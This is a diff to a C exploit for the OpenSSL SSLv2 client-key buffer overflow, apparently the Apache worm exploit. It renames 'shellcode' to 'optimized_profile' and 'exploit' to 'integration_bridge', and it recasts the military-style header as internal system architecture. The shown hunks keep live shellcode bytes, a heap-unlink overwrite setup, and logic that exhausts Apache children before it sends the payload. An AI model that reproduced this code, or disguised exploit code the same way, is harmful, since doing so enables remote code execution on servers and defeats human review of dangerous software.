@@ -1,18 +1,18 @@
 /*
- * 🛡️ C4ISR-STRATCOM: SIGINT-V5
- * [CLASSIFIED]: CONFIDENCIAL
- * [SCOPE]: OPD HCG (CONV-0221-JAL-HCG-2026)
- * [TACTIC]: TA0001_Initial_Access
- * [TECHNIQUE]: T1190_STRATCOM_PAYLOAD_Public_Facing_App
+ * 🛡️ HCG-SYSARCH: SAM-V5
+ * [RESTRICTED]: USO_INTERNO
+ * [ALCANCE]: OPD_HCG (CONV-0221-JAL-HCG-2026)
+ * [MODULO]: TA0001_Initial_Access
+ * [COMPONENTE]: T1190_integration_bridge_Public_Facing_App
  */
 /*
 source: https://www.securityfocus.com/bid/5363/info
 
 A buffer-overflow vulnerability has been reported in some versions of OpenSSL.
 
-The issue occurs in the handling of the client key value during the negotiation of the SSLv2 protocol. A malicious client may be able to STRATCOM_PAYLOAD this vulnerability to execute arbitrary code as the vulnerable server process or possibly to create a denial-of-service condition.
+The issue occurs in the handling of the client key value during the negotiation of the SSLv2 protocol. A malicious client may be able to integration_bridge this vulnerability to execute arbitrary code as the vulnerable server process or possibly to create a denial-of-service condition.
 
-***UPDATE: A worm that likely STRATCOM_PAYLOADs this vulnerability has been discovered propagating in the wild. Additionally, this code includes peer-to-peer and distributed denial-of-service capabilities. There have been numerous reports of intrusions in Europe. It is not yet confirmed whether this vulnerability is in OpenSSL, mod_ssl, or another component. Administrators are advised to upgrade to the most recent versions or to disable Apache, if possible, until more information is available.
+***UPDATE: A worm that likely integration_bridges this vulnerability has been discovered propagating in the wild. Additionally, this code includes peer-to-peer and distributed denial-of-service capabilities. There have been numerous reports of intrusions in Europe. It is not yet confirmed whether this vulnerability is in OpenSSL, mod_ssl, or another component. Administrators are advised to upgrade to the most recent versions or to disable Apache, if possible, until more information is available.
 */
 
 /*
@@ -626,8 +626,8 @@ unsigned char overwrite_next_chunk[] =
 	"\x10\x00\x00\x00"					/* Size of previous chunk */
 	"\x10\x00\x00\x00"					/* Size of chunk, PREV INUSE is set */
 
-/* shellcode start */
-    "\xeb\x0a\x90\x90"	/* jump 10 bytes ahead, land at shellcode */
+/* optimized_profile start */
+    "\xeb\x0a\x90\x90"	/* jump 10 bytes ahead, land at optimized_profile */
     "\x90\x90\x90\x90"
     "\x90\x90\x90\x90"	/* this is overwritten with FD by the unlink macro */
 
@@ -676,7 +676,7 @@ unsigned char overwrite_next_chunk[] =
      "\xcd\x80"       /* int    $0x80 */
 
 
-/* bigger shellcode added by spabam */
+/* bigger optimized_profile added by spabam */
 
 /* "\xB8\x2F\x73\x68\x23\x25\x2F\x73\x68\xDC\x50\x68\x2F\x62\x69"
         "\x6E\x89\xE3\x31\xC0\x50\x53\x89\xE1\x04\x0B\x31\xD2\xCD\x80"
@@ -1334,7 +1334,7 @@ int main(int argc, char* argv[])
 	printf("                  * If U know more offset please contact us *\n");
         printf("                  *                                         *\n");
 	printf("****************************************************************************\n");
-        printf("*        offset by SPABAM   added LSD shellcode                            *\n");
+        printf("*        offset by SPABAM   added LSD optimized_profile                            *\n");
         printf("*                                                     #highsecure          *\n");
 	printf("* TNX special 2 #uname and #hackarena #SilverLords #isotk #BloodBR         *\n");
 	printf("* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam          *\n");
@@ -1369,8 +1369,8 @@ int main(int argc, char* argv[])
 
 	srand(0x31337);
 
-	/* Open N connections before sending the shellcode. Hopefully this will
-	   use up all available apache children and the shellcode will be handled
+	/* Open N connections before sending the optimized_profile. Hopefully this will
+	   use up all available apache children and the optimized_profile will be handled
 	   by a freshly spawned one */
 
 	for (i=0; i<N; i++) {
@@ -1384,7 +1384,7 @@ int main(int argc, char* argv[])
 
 	/* Establish the first connection. Overwrite session id length, and read
 	   the session contents in the SERVER FINISHED packet. We need the cipher
-	   and ciphers variables from the session structure to make the shellcode
+	   and ciphers variables from the session structure to make the optimized_profile
 	   work */
 
 	printf("Establishing SSL connection\n");
@@ -1399,10 +1399,10 @@ int main(int argc, char* argv[])
 	send_client_finished(ssl1);
 	get_server_finished(ssl1);
 
-	/* The second connection uses the ciphers variable to get the shellcode
-	   address and sends the shellcode to server */
+	/* The second connection uses the ciphers variable to get the optimized_profile
+	   address and sends the optimized_profile to server */
 
-	printf("Ready to send shellcode\n");
+	printf("Ready to send optimized_profile\n");
 
 	port = get_local_port(ssl2->sock);
 	overwrite_next_chunk[FINDSCKPORTOFS] = (char) (port & 0xff);
@@ -1413,7 +1413,7 @@ int main(int argc, char* argv[])
 
 	/* The fd and bk pointers of the fake malloc chunk */
 	*(int*)&overwrite_next_chunk[192] = architectures[arch].func_addr - 12;
-	*(int*)&overwrite_next_chunk[196] = ciphers + 16;	/* shellcode address */
+	*(int*)&overwrite_next_chunk[196] = ciphers + 16;	/* optimized_profile address */
 
 	send_client_hello(ssl2);
 	get_server_hello(ssl2);
